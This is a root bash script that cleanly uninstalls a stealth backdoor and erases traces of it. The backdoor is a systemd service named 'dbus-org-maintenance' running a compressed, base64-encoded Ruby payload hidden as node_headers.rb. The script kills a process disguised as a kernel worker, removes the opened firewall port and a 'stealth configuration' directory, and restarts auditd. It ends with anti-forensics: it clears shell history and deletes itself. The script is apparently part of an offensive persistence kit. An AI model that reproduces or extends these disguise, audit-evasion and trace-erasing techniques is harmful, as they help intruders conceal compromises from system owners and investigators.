#!/bin/bash

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

ST_NAME="dbus-org-maintenance"
ST_SCRIPT="node_headers.rb"
RUBY_SCRIPT_PATH="/usr/local/include/$ST_SCRIPT"
SERVICE_PATH="/etc/systemd/system/$ST_NAME.service"
CONF_DIR="/etc/systemd/system/$ST_NAME.service.d"

print_step() { echo -e "${YELLOW}[...]${NC} $1"; }
print_log() { echo -e "${GREEN}[OK]${NC} $1"; }

# 1. Root Check
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[ERROR] Please run as root.${NC}"
    exit 1
fi

echo -e "${YELLOW}Starting Full Reversion (Uninstall)...${NC}"

print_step "Stopping and removing service: $ST_NAME..."
if command -v systemctl > /dev/null 2>&1; then
    systemctl stop $ST_NAME.service > /dev/null 2>&1
    systemctl disable $ST_NAME.service > /dev/null 2>&1
    systemctl daemon-reload > /dev/null 2>&1
    systemctl reset-failed > /dev/null 2>&1
else
    # Fallback for environments without systemd (like Docker)
    pkill -f "$ST_SCRIPT" > /dev/null 2>&1
    pkill -f "\[kworker/u2:1\]" > /dev/null 2>&1
fi

if [ -f "$SERVICE_PATH" ]; then
    rm "$SERVICE_PATH"
    print_log "Service file removed."
fi

if [ -d "$CONF_DIR" ]; then
    rm -rf "$CONF_DIR"
    print_log "Stealth configuration directory removed."
fi

print_step "Removing Ruby script from $RUBY_SCRIPT_PATH..."
if [ -f "$RUBY_SCRIPT_PATH" ]; then
    PORT=$(ruby -e "require 'zlib'; require 'base64'; script = File.read('$RUBY_SCRIPT_PATH'); if script =~ /decode64\(\"(.+)\"\)\)/; decoded = Zlib::Inflate.inflate(Base64.decode64(\$1)); puts decoded[/PORT = (\d+)/, 1]; end" 2>/dev/null)
    
    rm "$RUBY_SCRIPT_PATH"
    print_log "Script removed."
fi

print_step "Cleaning firewall rules (iptables/ufw)..."
if [ ! -z "$PORT" ]; then
    iptables -D INPUT -p tcp --dport "$PORT" -j ACCEPT > /dev/null 2>&1 
    if command -v ufw > /dev/null 2>&1; then
        ufw delete allow "$PORT"/tcp > /dev/null 2>&1
    fi
    print_log "Network rules cleared for port $PORT."
else
    echo -e "${YELLOW}[!] Could not auto-detect port. Manual iptables check recommended.${NC}"
fi

if command -v systemctl > /dev/null 2>&1 && systemctl list-unit-files | grep -q auditd; then
    print_step "Restarting system auditing service (auditd)..."
    systemctl start auditd > /dev/null 2>&1
    print_log "Auditd reactivated."
fi

echo -e "\n${GREEN}====================================================${NC}"
echo -e "${GREEN}SUCCESS:${NC} The system has been cleaned."
echo -e "${YELLOW}Service:${NC} Stopped & Removed"
echo -e "${YELLOW}Files:${NC} Deleted"
echo -e "${GREEN}====================================================${NC}"

history -c
rm -- "$0"
